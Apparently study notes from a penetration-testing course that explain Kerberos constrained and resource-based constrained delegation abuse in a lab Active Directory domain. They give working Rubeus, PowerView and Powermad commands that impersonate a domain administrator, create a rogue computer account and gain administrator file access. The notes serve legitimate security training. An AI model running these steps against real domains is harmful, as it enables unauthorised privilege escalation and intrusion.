Constrained delegation is configured on the **computer or user object**. It is set through the **msds-allowedtodelegateto** property by specifying the SPNs the current object is allowed constrained delegation against.

```pwsh
Get-DomainUser -TrustedToAuth
```

```
distinguishedname        : CN=IISSvc,OU=prodUsers,DC=prod,DC=corp1,DC=com
userprincipalname        : IISSvc@prod.corp1.com
samaccountname           : IISSvc
samaccounttype           : USER_OBJECT
msds-allowedtodelegateto : {MSSQLSvc/CDC01.prod.corp1.com:SQLEXPRESS,
                           MSSQLSvc/cdc01.prod.corp1.com:1433}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=corp1,DC=com
serviceprincipalname     : HTTP/web
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
```

Constrained delegation is configured for the IISSvc account. It is a service account for a web server running IIS.

The **msds-allowedtodelegateto** property contains the SPN of the MS SQL server on CDC01. => constrained delegation is only allowed to that SQL server.

TRUSTED_TO_AUTH_FOR_DELEGATION value in the useraccountcontrol property is set. This value is used to indicate whether constrained delegation can be used if the authentication between the user and the service uses a different authentication mechanism like NTLM.

**S4U2Self** extension:
 
If a **frontend** service does not use Kerberos authentication and the backend service does, it needs to be able to request a TGS to the frontend service from a KDC on behalf of the user who is authenticating against it. The S4U2Self extension enables this if the TRUSTED_TO_AUTH_FOR_DELEGATION value is present in the useraccountcontrol property. Additionally, the frontend service can do this without requiring the password or the hash of the user.

=> If we compromise the IISSvc account, we can request a service ticket to IIS for any user in the domain, including a domain administrator.

**S4U2proxy** extension requests a service ticket for the **backend** service on behalf of a user. This extension depends on the service ticket obtained either through S4U2Self or directly from a user authentication via Kerberos.

If Kerberos is used for authentication to the frontend service, S4U2Proxy can use a forwardable TGS supplied by the user.

=> Similarly to our initial attack that leveraged unconstrained delegation, we would require user interaction.

This extension allows IISSvc to request a service ticket to any of the services listed as SPNs in the msds-allowedtodelegateto field.

It would use the TGS obtained through the S4USelf extension and submit it as a part of the S4UProxy request for the backend service.

Once this service ticket request is made and the ticket is returned by the KDC, IISSvc can perform authentication to that specific service on that specific host.

If we compromise the IISSvc account, we can request a service ticket for the services listed in the msds-allowedtodelegateto field as any user in the domain. Depending on the type of service, this may lead to code execution.

Simulate a compromise of the IISSvc account and abuse that to gain access to the MSSQL instance on CDC01.

=> Rubeus, which includes S4U extension support.

Kekeo by Mimikatz also provides access to S4U extension abuse.

Note that we do not need to execute in the context of the IISSvc account in order to exploit the account. We only need the password hash.

However, if we only have the clear text password, we can generate the NTLM hash with Rubeus:

```pwsh
.\Rubeus.exe hash /password:lab
```

use Rubeus to generate a TGT for IISSvc

```pwsh
.\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /nowrap
```

Invoke the S4U extensions.

The username we want to impersonate (/impersonateuser), the administrator account of the domain

```pwsh
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
```

We obtained a usable service ticket for the MSSQL service instance on CDC01.

Validate that we are authenticated to MSSQL as the impersonated user:

```pwsh
.\SQL.exe
```

We have logged in to the MSSQL instance as the domain administrator.

By compromising an account that has constrained delegation enabled, we can gain access to all the services configured through the msDS-AllowedToDelegateTo property. If the **TRUSTED_TO_AUTH_FOR_DELEGATION** value is set, we can do this **without user interaction**.

Interestingly, when the TGS is returned from the KDC, the server name is encrypted, but not the service name.

=> Modify the service name within the TGS in memory and obtain access to a different service on the same host.

Attempt to gain access to the CIFS service:

```pwsh
.\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt
```

This TGS should yield access to the file system and potentially direct code execution. Unfortunately, the SPN for the MSSQL server ends with ":1433", which is not usable for CIFS since it requires an SPN with the format `CIFS/cdc01.prod.corp1.com`.

If the SPN configured for constrained delegation only uses the service and host name like www/cdc01.prod.corp1.com, we could modify the TGS to access any service on the system.

### Resource-Based Constrained Delegation

Constrained delegation works by configuring SPNs on the frontend service under the **msDS-AllowedToDelegateTo** property. Configuring constrained delegation requires the **SeEnableDelegationPrivilege** privilege on the domain controller, which is typically only enabled for Domain Admins.

Resource-based constrained delegation (RBCD) is meant to remove the requirement of highly elevated access rights like **SeEnableDelegationPrivilege** from system administrators.

The **msDS-AllowedToActOnBehalfOfOtherIdentity** property controls delegation **from the backend service**. To configure RBCD, the SID of the frontend service is written to the new property of the backend service.

RBCD can typically be configured by the backend service administrator instead.

Once RBCD has been configured, the frontend service can use S4U2Self to request the forwardable TGS for any user to itself followed by S4U2Proxy to create a TGS for that user to the backend service.

Unlike constrained delegation, under RBCD the KDC checks if the SID of the frontend service is present in the msDS-AllowedToActOnBehalfOfOtherIdentity property of the backend service.

**The frontend service must have an SPN set** in the domain. A user account typically does not have an SPN set but all computer accounts do.

=> Any attack against RBCD needs to happen from a **computer account or a service account with a SPN**.

The same attack against constrained delegation applies to RBCD if we can compromise a frontend service that has its SID configured in the msDS-AllowedToActOnBehalfOfOtherIdentity property of a backend service.

E.g., A RBCD attack that leads to code execution on appsrv01.

Starts by compromising a domain account that has the **GenericWrite** access right on a computer account object.

```pwsh
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

```
AceType               : AccessAllowed
ObjectDN              : CN=APPSRV01,OU=prodComputers,DC=prod,DC=corp1,DC=com
ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
Identity              : PROD\dave
```

The dave user has GenericWrite to appsrv01.

We can update any non-protected property on that object, including **msDS-AllowedToActOnBehalfOfOtherIdentity** and add the SID of a different computer.

Once a SID is added, we will act in the context of that computer account and we can execute the S4U2Self and S4U2Proxy extensions to obtain a TGS for appsrv01.

We either have to obtain the password hash of a computer account or simply create a new computer account object with a selected password.

By default, any authenticated user can add up to 10 computer accounts to the domain and they will have SPNs set automatically. This value is present in the ms-DS-MachineAccountQuota property in the Active Directory domain object.

Enumerate ms-DS-MachineAccountQuota

```pwsh
Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota
```

Normally, the computer account object is created when a physical computer is joined to the domain. We can simply create the object itself with the New-MachineAccount method of the Powermad.ps1 PowerShell script.

```pwsh
. .\powermad.ps1

New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)

Get-DomainComputer -Identity myComputer
```

The msDS-AllowedToActOnBehalfOfOtherIdentity property stores the SID as part of a security descriptor in a binary format. We must convert the SID of our newly-created computer object to the correct format in order to proceed with the attack.

Create a new security descriptor with the correct SID. In the beginning of this module, we determined that the SID is the last portion of a security descriptor string so we can reuse a working string, replacing only the SID.

Fortunately, security researchers have discovered a valid security descriptor string that we can use as shown in Listing 37. We can use the RawSecurityDescriptor class to instantiate a SecurityDescriptor object:

```pwsh
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
```

With the SecurityDescriptor object created, we must convert it into a byte array to match the format for the msDS-AllowedToActOnBehalfOfOtherIdentity property:

```pwsh
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)
```

Obtain a handle to the computer object for appsrv01 and then pipe that into Set-DomainObject, which can update properties by specifying them with -Set options (Setting msds-allowedtoactonbehalfofotheridentity)

```pwsh
Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Since our dave user has the GenericWrite access right to appsrv01, we can set this property.

We can also use this attack vector with GenericAll, WriteProperty, or WriteDACL access rights to appsrv01.

After writing the SecurityDescriptor to the property field, we should verify it

```pwsh
$RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity

$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0

$Descriptor.DiscretionaryAcl
```

Verifying the SID in the SecurityDescriptor

```pwsh
ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-2101
```

The SecurityDescriptor was indeed set correctly in the msDS-AllowedToActOnBehalfOfOtherIdentity property for appsrv01.
Now we can begin our attack in an attempt to compromise appsrv01. We'll start by obtaining the hash of the computer account password with Rubeus:

```pwsh
.\Rubeus.exe hash /password:h4x
```

In the previous section, we used the Rubeus asktgt command to request a TGT before invoking the s4u command. We can also directly submit the username and password hash to the s4u command, which will implicitly call asktgt and inject the resultant TGT, after which the S4U extensions will be invoked:

```
.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt
```

After obtaining the TGT for the myComputer machine account, S4U2Self will then request a forwardable service ticket as the administrator user to the myComputer computer account.
Finally, S4U2Proxy is invoked to request a TGS for the CIFS service on appsrv01 as the administrator user, after which it is injected into memory.
To check the success of this attack, we'll first dump any loaded Kerberos tickets with klist:

```pwsh
klist
```

Now that we have a TGS for the CIFS service on appsrv01 as administrator, we can interact with file services on appsrv01 in the context of the administrator domain admin user:

```pwsh
dir \\appsrv01.prod.corp1.com\c$
```

Our access to appsrv01 is in the context of the administrator domain admin user. We can use our CIFS access to obtain code execution on appsrv01, but in the process we will perform a network login instead of an interactive login. => our access will be limited to appsrv01 and cannot directly be used to expand access towards the rest of the domain.